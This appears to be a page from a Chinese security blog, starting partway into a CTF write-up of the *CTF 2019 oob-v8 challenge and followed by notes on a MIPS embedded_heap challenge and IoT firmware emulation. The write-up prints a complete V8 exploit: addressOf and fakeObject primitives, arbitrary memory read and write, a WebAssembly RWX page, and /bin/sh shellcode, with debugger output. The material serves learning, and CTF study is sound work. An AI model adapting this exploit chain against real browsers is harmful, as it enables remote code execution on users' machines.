class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak wasm_func_addr: 0x"</span> + hex(f_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak rwx_page_addr: 0x"</span> + hex(rwx_page_addr));</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">[*] leak wasm func addr: 0x000019659b1a1fe8</span><br><span class="line">[*] leak rwx_page_addr: 0x000028c152102000</span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; vmmap 0x000028c152102000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x28c152102000     0x28c152103000 rwxp     1000 0       +0x0</span><br></pre></td></tr></table></figure>

<p>成功！</p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>编写getshell的部分</p>
<p>shellcode这里找的：<a href="https://www.it610.com/article/1295723160905261056.htm" target="_blank" rel="noopener">https://www.it610.com/article/1295723160905261056.htm</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode=[</span><br><span class="line">	<span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line">	<span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line">	<span class="number">0x050fd231583b6an</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    data_view.setBigUint64(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">f();<span class="comment">//调用wasm，实际调用到了shellcode</span></span><br></pre></td></tr></table></figure>

<h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3.read &amp; write anywhere××××××××</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak wasm_func_addr: 0x"</span> + hex(f_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak rwx_page_addr: 0x"</span> + hex(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[</span><br><span class="line"><span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line"><span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line"><span class="number">0x050fd231583b6an</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    data_view.setBigUint64(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/23/17-42-undefined/image-20201017022813473.png" alt="image-20201017022813473"></p>
<p>注：非root用户可以开shell，/bin/sh这个文件不是只有root才能执行，进root是提权洞存在的意义。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>从一道CTF题零基础学V8漏洞利用：<a href="https://www.freebuf.com/vuls/203721.html（这篇知识+调试，全但是有点杂，建议进一步理解时候看）" target="_blank" rel="noopener">https://www.freebuf.com/vuls/203721.html（这篇知识+调试，全但是有点杂，建议进一步理解时候看）</a></li>
<li>浏览器入门之starctf-OOB：<a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/（这篇方便调试，建议先看，调一遍）" target="_blank" rel="noopener">https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/（这篇方便调试，建议先看，调一遍）</a></li>
<li>Exploiting v8: *CTF 2019 oob-v8：<a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" target="_blank" rel="noopener">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></li>
<li>2019-StarCtf-oob：<a href="https://0xfocu5.github.io/posts/7eb4a1e6/" target="_blank" rel="noopener">https://0xfocu5.github.io/posts/7eb4a1e6/</a></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>花了好久，终于弄完了，真的是，做题5分钟，环境3小时的真实写照，环境强推国外云服务器，大概需要1天时间。</p>
<p>v8这块做下来，还是比较好理解的，可能刚开始看有点晕，但是静下心来好好想想还是能想得通。</p>
<blockquote>
<p>本文由<strong>winter</strong>原创发布<br>转载，请参考<a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener">转载声明</a>，注明出处： <a href="https://www.anquanke.com/post/id/219815" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219815</a><br>安全客 - 有思想的安全新媒体                            </p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/22/01-17-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/22/01-17-undefined/" class="post-title-link" itemprop="url">embedded(未完成)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-10-22 01:17:46" itemprop="dateCreated datePublished" datetime="2020-10-22T01:17:46+08:00">2020-10-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 16:58:52" itemprop="dateModified" datetime="2021-04-20T16:58:52+08:00">2021-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/iot/" itemprop="url" rel="index"><span itemprop="name">iot</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="embedded"><a href="#embedded" class="headerlink" title="embedded"></a>embedded</h2><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>mips架构的题，ida没法反编译成伪代码，用反编译mips的工具<code>ghidra</code>，安装包在文件夹里。windows下运行<code>ghidraRun.bat</code>,linux下执行<code>ghidraRun</code>,emm,需要有jdk的环境。</p>
<h3 id="传文件到qemu"><a href="#传文件到qemu" class="headerlink" title="传文件到qemu"></a>传文件到qemu</h3><p>将linux下的embedded_heap文件传入qemu：</p>
<p>linux：sudo ifconfig tap0 12.0.0.2</p>
<p>qemu：ifconfig eth0 12.0.0.1 </p>
<p>遇到设备不存在，ifconfig，在开头看网卡名字</p>
<p>ping通</p>
<p>linux：python -m SimpleHTTPServer</p>
<p>qemu：wget  12.0.0.2:8000/embedded_heap</p>
<p><img src="/2020/10/22/01-17-undefined/image-20200831110650474.png" alt="image-20200831110650474"></p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>将两个so.0文件放到/lib文件下（注意：是根目录，，，）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mv libuClibc-0.9.33.2.so libc.so.0</span><br><span class="line">$ mv ld-uClibc-0.9.33.2.so ld-uClibc.so.0</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/22/01-17-undefined/image-20200831191612015.png" alt="image-20200831191612015"></p>
<p>qemu-mips  -L ./ ./embedded_heap</p>
<p>也可以直接<code>./embedded_heap</code></p>
<p>【可以使用的原因可能是因为binutils的存在用编译器自动转换了】</p>
<p><strong>注意</strong></p>
<p>还要修改lib文件下链接文件的权限</p>
<p><img src="/2020/10/22/01-17-undefined/image-20200831191636914.png" alt="image-20200831191636914"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
<hr>
<h3 id="交叉编译环境"><a href="#交叉编译环境" class="headerlink" title="交叉编译环境"></a>交叉编译环境</h3><p><a href="https://baike.baidu.com/item/交叉编译/10916911" target="_blank" rel="noopener">交叉编译</a>（cross-compilation）是指，在某个主机平台上（比如PC上）用<a href="https://baike.baidu.com/item/交叉编译器/5125452" target="_blank" rel="noopener">交叉编译器</a>编译出可在其他平台上（比如ARM上）运行的代码的过程。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/22/01-08-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/22/01-08-undefined/" class="post-title-link" itemprop="url">固件iot基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-10-22 01:08:48" itemprop="dateCreated datePublished" datetime="2020-10-22T01:08:48+08:00">2020-10-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 16:57:54" itemprop="dateModified" datetime="2021-04-20T16:57:54+08:00">2021-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/iot/" itemprop="url" rel="index"><span itemprop="name">iot</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
<p><img src="/2020/10/22/01-08-undefined/image-20200829170912807.png" alt="image-20200829170912807"></p>
<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
<ul>
<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
</ul>
<p>使用：</p>
<ul>
<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
</ul>
<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
<ul>
<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/22/01-08-undefined/image-20200829174231769.png" alt="image-20200829174231769"></p>
<ul>
<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>

<p><img src="/2020/10/22/01-08-undefined/image-20200829174236510.png" alt="image-20200829174236510"></p>
<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
<ol>
<li>nday cve 漏洞分析和利用；</li>
<li>mips 指令集栈溢出漏洞的调试和利用</li>
</ol>
<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
<p>漏洞点：</p>
<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
<p><img src="/2020/10/22/01-08-undefined/image-20200830121124694.png" alt="image-20200830121124694"></p>
<p>操作步骤：</p>
<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
<p><img src="/2020/10/22/01-08-undefined/image-20200830121439048.png" alt="image-20200830121439048"></p>
